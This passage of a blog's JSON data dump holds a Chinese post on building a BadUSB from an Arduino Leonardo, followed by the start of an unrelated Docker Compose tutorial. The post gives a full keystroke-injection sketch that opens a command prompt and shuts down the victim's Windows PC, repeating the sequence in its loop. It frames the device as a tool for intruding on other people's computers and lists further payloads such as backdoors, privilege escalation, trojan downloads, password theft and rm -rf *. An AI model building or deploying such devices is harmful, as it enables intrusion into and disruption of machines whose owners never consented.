Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  delay(3000); \n  Keyboard.println(\"shutdown -s -t 10\");\n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.press(KEY_CAPS_LOCK);\n  Keyboard.release(KEY_CAPS_LOCK);\n  Keyboard.end();//结束键盘通讯 \n}\n```\n\n已经在多台Windows电脑上试验成功。\n\n\n# 效果\n![](/content/images/badusb/preview.gif)\n\n# 进阶\n\n当然，你可以实现很多功能\n\n- 删除系统关键注册表使之蓝屏\n- 留后门\n- 新建用户\n- 用户提权\n- 调用Powershell下载木马\n- 调用Powershell下载木马及从内存中提取出当前用户的Windows密码\n- rm -rf *\n\n此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。\n\nhttps://github.com/Xyntax/BadUSB-code\n\n# 参考\nhttp://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices\nhttp://www.freebuf.com/sectool/107242.html\nhttp://www.freebuf.com/articles/terminal/53886.html\n\n","source":"_posts/Arduino-Leonardo-打造-Bad-USB.md","raw":"---\ntitle: Arduino Leonardo 打造 Bad USB\ndate: 2016-11-27 02:48:23\ntags: Hack \ncategories: Hack\npermalink: badusb\n---\n\n嘿嘿嘿，又是一篇猥琐小文。\n\n<!--more -->\n\n# 简介\n\n什么是Bad USB？\n\n![](/content/images/badusb/0.jpg)\n\nBadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。\n\n简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。\n\n# 目标\n\n打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。\n\n![](/content/images/badusb/1.jpg)\n\n\n# 原料\n1. Arduino Leonardo\n2. 普通安卓USB线\n\n# 举个🌰\n\n比如我们要实现一个插入优盘就让对方电脑关机的功能：\n\n用Arduino开发者工具，选择\n\n![](/content/images/badusb/2.jpg)\n\nArduino Leonardo\n\n然后把程序烧录进去\n\n```C\n#include <Keyboard.h>\n\nvoid setup() {//初始化\n   Keyboard.begin();//开始键盘通讯 \n  delay(5000);//延时\n  Keyboard.press(KEY_LEFT_GUI);//win键 \n  delay(500); \n  Keyboard.press('r');//r键 \n  delay(500); \n  Keyboard.release(KEY_LEFT_GUI);\n  Keyboard.release('r');\n  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法\n  Keyboard.release(KEY_CAPS_LOCK);\n  delay(500); \n  Keyboard.println(\"CMD\");\n  delay(500); \n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  delay(3000); \n  Keyboard.println(\"shutdown -s -t 10\");\n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.press(KEY_CAPS_LOCK);\n  Keyboard.release(KEY_CAPS_LOCK);\n  Keyboard.end();//结束键盘通讯 \n}\nvoid loop()//循环\n{\n   Keyboard.begin();//开始键盘通讯 \n  delay(5000);//延时\n  Keyboard.press(KEY_LEFT_GUI);//win键 \n  delay(500); \n  Keyboard.press('r');//r键 \n  delay(500); \n  Keyboard.release(KEY_LEFT_GUI);\n  Keyboard.release('r');\n  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法\n  Keyboard.release(KEY_CAPS_LOCK);\n  delay(500); \n  Keyboard.println(\"CMD\");\n  delay(500); \n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  delay(3000); \n  Keyboard.println(\"shutdown -s -t 10\");\n  Keyboard.press(KEY_RETURN);\n  Keyboard.release(KEY_RETURN);\n  Keyboard.press(KEY_CAPS_LOCK);\n  Keyboard.release(KEY_CAPS_LOCK);\n  Keyboard.end();//结束键盘通讯 \n}\n```\n\n已经在多台Windows电脑上试验成功。\n\n\n# 效果\n![](/content/images/badusb/preview.gif)\n\n# 进阶\n\n当然，你可以实现很多功能\n\n- 删除系统关键注册表使之蓝屏\n- 留后门\n- 新建用户\n- 用户提权\n- 调用Powershell下载木马\n- 调用Powershell下载木马及从内存中提取出当前用户的Windows密码\n- rm -rf *\n\n此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。\n\nhttps://github.com/Xyntax/BadUSB-code\n\n# 参考\nhttp://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices\nhttp://www.freebuf.com/sectool/107242.html\nhttp://www.freebuf.com/articles/terminal/53886.html\n\n","slug":"badusb","published":1,"updated":"2017-03-08T19:05:11.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xnk00085es5b6dnsynd","content":"<p>嘿嘿嘿，又是一篇猥琐小文。</p>\n<a id=\"more\"></a>\n<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>什么是Bad USB？</p>\n<p><img src=\"/content/images/badusb/0.jpg\" alt=\"\"></p>\n<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>\n<p>简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。</p>\n<h1 id=\"目标\"><a href=\"#目标\" class=\"headerlink\" title=\"目标\"></a>目标</h1><p>打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。</p>\n<p><img src=\"/content/images/badusb/1.jpg\" alt=\"\"></p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ol>\n<li>Arduino Leonardo</li>\n<li>普通安卓USB线</li>\n</ol>\n<h1 id=\"举个🌰\"><a href=\"#举个🌰\" class=\"headerlink\" title=\"举个🌰\"></a>举个🌰</h1><p>比如我们要实现一个插入优盘就让对方电脑关机的功能：</p>\n<p>用Arduino开发者工具，选择</p>\n<p><img src=\"/content/images/badusb/2.jpg\" alt=\"\"></p>\n<p>Arduino Leonardo</p>\n<p>然后把程序烧录进去</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Keyboard.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">setup</span><span class=\"params\">()</span> </span>&#123;<span class=\"comment\">//初始化</span></div><div class=\"line\">   Keyboard.begin();<span class=\"comment\">//开始键盘通讯 </span></div><div class=\"line\">  delay(<span class=\"number\">5000</span>);<span class=\"comment\">//延时</span></div><div class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//win键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//r键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.release(KEY_LEFT_GUI);</div><div class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);<span class=\"comment\">//利用开大写输小写绕过输入法</span></div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"CMD\"</span>);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  delay(<span class=\"number\">3000</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"shutdown -s -t 10\"</span>);</div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯 </span></div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span><span class=\"comment\">//循环</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">   Keyboard.begin();<span class=\"comment\">//开始键盘通讯 </span></div><div class=\"line\">  delay(<span class=\"number\">5000</span>);<span class=\"comment\">//延时</span></div><div class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//win键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//r键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.release(KEY_LEFT_GUI);</div><div class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);<span class=\"comment\">//利用开大写输小写绕过输入法</span></div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"CMD\"</span>);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  delay(<span class=\"number\">3000</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"shutdown -s -t 10\"</span>);</div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯 </span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>已经在多台Windows电脑上试验成功。</p>\n<h1 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h1><p><img src=\"/content/images/badusb/preview.gif\" alt=\"\"></p>\n<h1 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h1><p>当然，你可以实现很多功能</p>\n<ul>\n<li>删除系统关键注册表使之蓝屏</li>\n<li>留后门</li>\n<li>新建用户</li>\n<li>用户提权</li>\n<li>调用Powershell下载木马</li>\n<li>调用Powershell下载木马及从内存中提取出当前用户的Windows密码</li>\n<li>rm -rf *</li>\n</ul>\n<p>此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。</p>\n<p><a href=\"https://github.com/Xyntax/BadUSB-code\" target=\"_blank\" rel=\"external\">https://github.com/Xyntax/BadUSB-code</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices\" target=\"_blank\" rel=\"external\">http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices</a><br><a href=\"http://www.freebuf.com/sectool/107242.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/sectool/107242.html</a><br><a href=\"http://www.freebuf.com/articles/terminal/53886.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/terminal/53886.html</a></p>\n","excerpt":"<p>嘿嘿嘿，又是一篇猥琐小文。</p>","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>什么是Bad USB？</p>\n<p><img src=\"/content/images/badusb/0.jpg\" alt=\"\"></p>\n<p>BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。</p>\n<p>简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。</p>\n<h1 id=\"目标\"><a href=\"#目标\" class=\"headerlink\" title=\"目标\"></a>目标</h1><p>打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。</p>\n<p><img src=\"/content/images/badusb/1.jpg\" alt=\"\"></p>\n<h1 id=\"原料\"><a href=\"#原料\" class=\"headerlink\" title=\"原料\"></a>原料</h1><ol>\n<li>Arduino Leonardo</li>\n<li>普通安卓USB线</li>\n</ol>\n<h1 id=\"举个🌰\"><a href=\"#举个🌰\" class=\"headerlink\" title=\"举个🌰\"></a>举个🌰</h1><p>比如我们要实现一个插入优盘就让对方电脑关机的功能：</p>\n<p>用Arduino开发者工具，选择</p>\n<p><img src=\"/content/images/badusb/2.jpg\" alt=\"\"></p>\n<p>Arduino Leonardo</p>\n<p>然后把程序烧录进去</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Keyboard.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">setup</span><span class=\"params\">()</span> </span>&#123;<span class=\"comment\">//初始化</span></div><div class=\"line\">   Keyboard.begin();<span class=\"comment\">//开始键盘通讯 </span></div><div class=\"line\">  delay(<span class=\"number\">5000</span>);<span class=\"comment\">//延时</span></div><div class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//win键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//r键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.release(KEY_LEFT_GUI);</div><div class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);<span class=\"comment\">//利用开大写输小写绕过输入法</span></div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"CMD\"</span>);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  delay(<span class=\"number\">3000</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"shutdown -s -t 10\"</span>);</div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯 </span></div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">loop</span><span class=\"params\">()</span><span class=\"comment\">//循环</span></div><div class=\"line\"></span>&#123;</div><div class=\"line\">   Keyboard.begin();<span class=\"comment\">//开始键盘通讯 </span></div><div class=\"line\">  delay(<span class=\"number\">5000</span>);<span class=\"comment\">//延时</span></div><div class=\"line\">  Keyboard.press(KEY_LEFT_GUI);<span class=\"comment\">//win键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(<span class=\"string\">'r'</span>);<span class=\"comment\">//r键 </span></div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.release(KEY_LEFT_GUI);</div><div class=\"line\">  Keyboard.release(<span class=\"string\">'r'</span>);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);<span class=\"comment\">//利用开大写输小写绕过输入法</span></div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"CMD\"</span>);</div><div class=\"line\">  delay(<span class=\"number\">500</span>); </div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  delay(<span class=\"number\">3000</span>); </div><div class=\"line\">  Keyboard.println(<span class=\"string\">\"shutdown -s -t 10\"</span>);</div><div class=\"line\">  Keyboard.press(KEY_RETURN);</div><div class=\"line\">  Keyboard.release(KEY_RETURN);</div><div class=\"line\">  Keyboard.press(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.release(KEY_CAPS_LOCK);</div><div class=\"line\">  Keyboard.end();<span class=\"comment\">//结束键盘通讯 </span></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>已经在多台Windows电脑上试验成功。</p>\n<h1 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h1><p><img src=\"/content/images/badusb/preview.gif\" alt=\"\"></p>\n<h1 id=\"进阶\"><a href=\"#进阶\" class=\"headerlink\" title=\"进阶\"></a>进阶</h1><p>当然，你可以实现很多功能</p>\n<ul>\n<li>删除系统关键注册表使之蓝屏</li>\n<li>留后门</li>\n<li>新建用户</li>\n<li>用户提权</li>\n<li>调用Powershell下载木马</li>\n<li>调用Powershell下载木马及从内存中提取出当前用户的Windows密码</li>\n<li>rm -rf *</li>\n</ul>\n<p>此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。</p>\n<p><a href=\"https://github.com/Xyntax/BadUSB-code\">https://github.com/Xyntax/BadUSB-code</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices\">http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices</a><br><a href=\"http://www.freebuf.com/sectool/107242.html\">http://www.freebuf.com/sectool/107242.html</a><br><a href=\"http://www.freebuf.com/articles/terminal/53886.html\">http://www.freebuf.com/articles/terminal/53886.html</a></p>"},{"title":"Docker Compose—简化复杂应用的利器 ","date":"2016-10-15T18:10:35.000Z","_content":"Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。\n<!-- more --> \n## 1. 安装Docker和Compose\n```bash\n# 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n```\n```bash\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\n\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n\n当前最新的Docker是1.6.2，Compose为1.2.0\n```bash\nsudo apt-get update\nsudo apt-get install lxc-docker\n```\n参考 http://docs.docker.com/compose/install/#install-compose\n```bash\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose\n\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n这样compose就安装好了，查看一下compose的版本信息：\n\n```bash\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0\n```\n## 2. 使用Compose\n使用Compose只需要简单的三个步骤：\n\n首先，使用Dockerfile来定义你的应用环境：\n```bash\nFROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt\n```\n其中，requirements.txt中的内容包括：\n\n```bash\nflask\nredis\n```\n再用Python写一个简单的app.py\n```python\nfrom flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)\n```\n第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用\n```bash\nweb:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis\n```\n第三步，执行``docker-compose up``来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。\n```bash\nCreating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---> d833e0b23482\nStep 1 : ADD . /code\n ---> 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---> Running in f495a62feac9\n ---> ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat\n```\n## 3. Yaml文件参考\n\n在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\n\nimage:镜像的ID\n\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\n\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\n\nexternal_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\n\ncommand：替换默认的command命令\n\nports: 导出端口。格式可以是：\n\n```\nports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"\n```\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\n\nvolumes：加载路径作为卷，可以指定只读模式。\n```\nvolumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro\n ```\n volumes_from：加载其他容器或者服务的所有卷\n```\nenvironment:- RACK_ENV=development\n  - SESSION_SECRET\n```\nenv_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development\n\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\n```\ncommon.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres\n```\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。\ndns：可以设置一个或多个自定义的DNS地址。\n\ndns_search:可以设置一个或多个DNS的扫描域。\n\n其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：\n\n```\ncpu_shares:73\nworking_dir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmem_limit:1000000000\nprivileged:true\nrestart: always\nstdin_open:true\ntty:true\n```\n## 4. docker-compose常用命令\n\n在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：\n\n--verbose：输出详细信息\n\n-f 制定一个非docker-compose.yml命名的yaml文件\n\n-p 设置一个项目名称（默认是directory名）\n\ndocker-compose的动作包括：\n\nbuild：构建服务\n\nkill -s SIGINT：给服务发送特定的信号。\n\nlogs：输出日志\n\nport：输出绑定的端口\n\nps：输出运行的容器\n\npull：pull服务的image\n\nrm：删除停止的容器\n\nrun: 运行某个服务，例如docker-compose run web\npython manage.py shell\n\nstart：运行某个服务中存在的容器。\n\nstop:停止某个服务中存在的容器。\n\nup：create + run + attach容器到服务。\n\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\n>转载:http://debugo.com/docker-compose\n                                   \n","source":"_posts/Docker-Compose—简化复杂应用的利器.md","raw":"---\ntitle: 'Docker Compose—简化复杂应用的利器 '\ndate: 2016-10-15 19:10:35\ntags: Docker\ncategories: Docker\n---\nCompose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。\n<!-- more --> \n## 1. 安装Docker和Compose\n```bash\n# 当前最新的Docker是1.6.2，Compose为1.2.0\ncurl -s https://get.docker.io/ubuntu/ | sudo sh\nsudo apt-get update\nsudo apt-get install lxc-docker\n# 参考http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n```\n```bash\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\n\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n\n当前最新的Docker是1.6.2，Compose为1.2.0\n```bash\nsudo apt-get update\nsudo apt-get install lxc-docker\n```\n参考 http://docs.docker.com/compose/install/#install-compose\n```bash\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m > /usr/local/bin/docker-compose\n\nchmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。\napt-get install python-pip python-dev\npip install -U docker-compose\n```\n这样compose就安装好了，查看一下compose的版本信息：\n\n```bash\nchmod +x /usr/local/bin/docker-compose\ndocker-compose -version\ndocker-compose 1.2.0\n```\n## 2. 使用Compose\n使用Compose只需要简单的三个步骤：\n\n首先，使用Dockerfile来定义你的应用环境：\n```bash\nFROM python:2.7\nADD ./code\nWORKDIR /code\nRUN pip install -r requirements.txt\n```\n其中，requirements.txt中的内容包括：\n\n```bash\nflask\nredis\n```\n再用Python写一个简单的app.py\n```python\nfrom flask importFlaskfrom redis importRedisimport os\napp =Flask(__name__)\nredis =Redis(host='redis', port=6379)@app.route('/')def hello():\n    redis.incr('hits')return'Hello World! I have been seen %s times.'% redis.get('hits')if __name__ ==\"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)\n```\n第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用\n```bash\nweb:\n  build:.\n  command: python app.py\n  ports:\n         - \"5000:5000\"\n  volumes:\n         - .:/code\n  links:\n         - redis\nredis:\n  image: redis\n```\n第三步，执行``docker-compose up``来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。\n```bash\nCreating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---> 